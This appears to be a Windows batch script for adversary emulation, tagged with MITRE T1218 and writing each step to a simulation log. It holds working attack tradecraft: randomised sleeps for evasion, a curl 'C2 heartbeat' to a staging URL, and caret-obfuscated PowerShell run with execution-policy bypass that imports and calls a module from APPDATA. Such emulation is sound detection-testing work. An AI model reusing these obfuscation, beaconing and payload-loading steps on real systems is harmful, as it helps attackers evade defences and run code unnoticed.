@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\8494\05788f1d
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8494-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=control.txt
SET dvhhyc=8494

REM Random utility variables
SET vfdhbk=%APPDATA%\!rrocubc!\macula-simulations.log
SET kllmjj=%APPDATA%\!rrocubc!
SET ytrewq=C:\Windows\diagnostics\system\Audio

REM Initial random delay 30-60 seconds
SET /A qazxsw=%RANDOM% %% 31 + 30
timeout /t !qazxsw! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete=!qazxsw!>> "!vfdhbk!" 2>nul

REM C2 Heartbeat
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start=!keghkgto!>> "!vfdhbk!" 2>nul
curl -k -s -o nul "!keghkgto!"
SET zxcvbn=%ERRORLEVEL%
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_result=!zxcvbn!>> "!vfdhbk!" 2>nul

REM Random delay 5-15 seconds
ping -n 7 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_complete=ping_7>> "!vfdhbk!" 2>nul

REM Ensure temp directory exists
SET cdewsx=m^k^d "!kllmjj!"
CALL !cdewsx! 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_created=!kllmjj!>> "!vfdhbk!" 2>nul

REM Random delay using CHOICE
CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_complete=choice_8>> "!vfdhbk!" 2>nul

REM Obfuscated PowerShell command fragments
SET plkjh=p^o^w^e^r^s^h^e^l^l^.^e^x^e
SET mnbvc=-^e^p b^y^p^a^s^s
SET lkjhg=-^c^o^m^m^a^n^d
SET poiuy="s^e^t^-l^o^c^a^t^i^o^n -^p^a^t^h !ytrewq!; i^m^p^o^r^t^-m^o^d^u^l^e .^\!txisnba!\!xzanpex!; [^P^r^o^g^r^a^m^]^:^:^D^a^l^e^(^)"

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: powershell_build_start=!plkjh!>> "!vfdhbk!" 2>nul

REM Execute obfuscated PowerShell
!plkjh! !mnbvc! !lkjhg! !poiuy!
SET qwerty=%ERRORLEVEL%
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: powershell_execution=!qwerty!>> "!vfdhbk!" 2>nul

REM TTP logging
SET /A ttp_result=0
SET ttp_error=
IF !qwerty! EQU 0 (
    SET /A ttp_result=1
    SET ttp_error=
) ELSE (
    SET ttp_error=assembly_load_failed
)

REM Normalize timestamp
SET timestamp=!DATE:/=-! !TIME!
echo [!timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution=!ttp_result!::!ttp_error!>> "!vfdhbk!" 2>nul

REM Random final delay
SET /A zxcasd=%RANDOM% %% 20 + 10
timeout /t !zxcasd! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_complete=!zxcasd!>> "!vfdhbk!" 2>nul